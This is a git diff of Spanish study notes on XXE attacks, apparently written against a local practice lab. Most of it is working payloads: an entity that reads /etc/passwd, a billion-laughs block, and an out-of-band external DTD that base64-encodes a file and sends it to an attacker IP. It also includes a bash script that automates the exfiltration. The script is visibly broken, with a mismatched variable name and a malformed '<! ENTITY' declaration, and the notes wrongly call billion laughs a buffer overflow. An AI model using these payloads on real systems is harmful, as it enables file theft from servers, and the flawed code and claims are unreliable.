@@ -31,12 +31,12 @@ A continuación, se proporciona el enlace al proyecto de GitHub correspondiente 
 
 En el archivo XML debemos de colocar un DOCTYPE y ese es el que estaremos modificando
 ```xml
-<?xml version="1.0" encoding="UTF-8"?>
-	<!DOCTYPE foo [<!ENTITY myName "omar">]>                                                        <!-- Colocamos lo que queremos que salga en el output de la web -->
+<?xml version="1.0" encoding="UTF-8"?>           <!-- Declaracion de XML--> 
+	<!DOCTYPE foo [<!ENTITY myName "omar">]>    <!-- DTD y colocamos lo que queremos que salga en el output de la web -->
 	<root>
 		<name>
 			<email>
-				&myFile;
+				&myName;
 			</email>
 		</name>
 	</root>
@@ -44,7 +44,7 @@ En el archivo XML debemos de colocar un DOCTYPE y ese es el que estaremos modifi
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
-	<!DOCTYPE foo [<!ENTITY myFile SYSTEM "file:///etc/passwd">]>                                    <!-- Colocamos la ruta abosluta del archivo -->
+	<!DOCTYPE foo [<!ENTITY myFile SYSTEM "file:///etc/passwd">]>       <!-- Colocamos la ruta abosluta del archivo -->
 	<root>
 		<name>
 			<email>
@@ -66,20 +66,8 @@ En el archivo XML debemos de colocar un DOCTYPE y ese es el que estaremos modifi
 	</root>
 ```
 
-```xml
-<?xml version="1.0" encoding="UTF-8"?>
-	<!DOCTYPE foo [<!ENTITY myFile SYSTEM "http://192.168.68.108/testXXE">]>            <!-- Hara una peticion GET a nuestro servidor buscando el archivo testXXE -->
-	<root>
-		<name>
-			<email>
-				&myFile;                                                              <!-- Llamamos a la entidad desde aqui -->
-			</email>
-		</name>
-	</root>
-```
-
 ```xml 
-<!-- Un millon de risas -->
+<!-- Un millon de risas, ataque de Buffer Overflow-->
 
 <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE example [
@@ -108,53 +96,57 @@ En el archivo XML debemos de colocar un DOCTYPE y ese es el que estaremos modifi
 ]>
 ```
 
-## **XXE OOB Blind**
-Cuando no se puede llamar la entidad desde el campo seleccionado en la estructura, lo llamamos desde el DOCTYPE colocando el porcentaje al inicio y final con el nombre. El archivo debe de tener la extensión **.dtd**
+## XXE OOB (Out Of Band) Blind 'External DTD'
+
 ```xml
+<!-- Esto se hace cuando no podemos declara entidades, en esta ocasion lo llamaremos desde le propio DTD -->
+
 <?xml version="1.0" encoding="UTF-8"?>
-	<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://192.168.68.108/malicious.dtd"> %xxe;]>       <!-- Hara una peticion GET a nuestro servidor buscando el archivo testXXE -->
+	<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://IP/malicious.dtd"> %xxe;]>      
+	<!-- Hara una peticion GET a nuestro servidor buscando el archivo malicious.dtd -->
 	<root>
 		<name>
 			<email>
-				test@test.com                                                              <!-- Aveces no podemos llamar la entidad desde aqui -->
+				test@test.com
 			</email>
 		</name>
 	</root>
+
+	<!-- IP = Direccion IP del atacante -->
 ```
 
-* Así es como haríamos un archivo .dtd externo
-```bash
-❯ nvim malicious.dtd                        # Creamos el archivo malicioso
-```
+```bash 
+# Creamos el archivo DTD externo, en donde haremos que el '/etc/passwd' de la maquina victima nos lo regrese en base64 en una peticion por GET.
 
-* Haremos que el output en base64 me lo envié a mi maquina de atacante como una petición por GET. Esto dentro del archivo  malicious.dtd
-```xml
+❯ nvim malicious.dtd
+
 <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://192.168.68.108/?file=%file;' >">                  <!-- Debemos de colocar el % en HEX = 25 --> 
-%eval;                                                                                                   <!-- Debemos de llamar a las entidades --> 
-%exfil; 
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://IP/?file=%file;'>">
+%eval;
+%exfil;
+
+	# Cuando tenemos dos 'ENTITY' seguidas, debemos de colocar el '%' en hexadecimal = &#x25; 
+	# IP = Direccion IP del atacante 
 ```
 
-```bash
-❯ python3 -m http.server 80                 # Nos montamos un servidor http 80 para recibir las peticiones 
+```bash 
+❯ python3 -m http.server 80     # Creamos un servidor http por el puerto 80 para compartir el archivo 'malicious.dtd'
 ```
 
+### Automatizar el proceso 
 
-Con este automatizas el proceso y puedes solicitar el archivo que quieras.
 ```bash
 ❯ nvim xxe_oob.sh                        # Creamos el archivo para automatizar el resultado final 
-```
 
-```bash
 #!/bin/bash
 
-echo -ne "[+] Introdiuce el archivo a leer: " && read -r myFilename
+echo -ne "[+] Introdiuce el archivo a leer: " && read -r myFilename   # n = Introducir el input en la misma linea, e = Salto de linea al principio
 
 maliciuos_dtd="""
-<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=$myFilename">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://192.168.68.108/?file=%file;'>">                  
+<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=$myFilename\">
+<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://IP/?file=%file;'>\">                  
 %eval;                                                                                                    
-%exfil; """
+%exfil; """          # IP = Maquina de atacante 
 
 echo $malicious_dtd > malicious.dtd
 
@@ -165,14 +157,13 @@ PID=$!
 sleep 1; echo
 
 curl -s -X POST "http://localhost:5000/process.php" -d '<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [<! ENTITY % xxe SYSTEM "http://192.168.68.108/malicious.dtd"> %xxe;]>      
-<root><name><email>test@test.com</email></name></root>' &>/dev/null
+<!DOCTYPE foo [<! ENTITY % xxe SYSTEM "http://IP/malicious.dtd"> %xxe;]>      
+<root><name>test</name><tel>12345</tel><email>test@test.com</email><password>omar123</password></root>' &>/dev/null
 
-cat response  | grep -oP "/?file=\K[^.*]+" | base64 -d
+cat response | grep -oP "/?file=\K[^.*\s]+" | base64 -d
 
 kill -9 $PID 
 wait $PID 2>/dev/null
 
 rm response 2>/dev/null
-
 ```
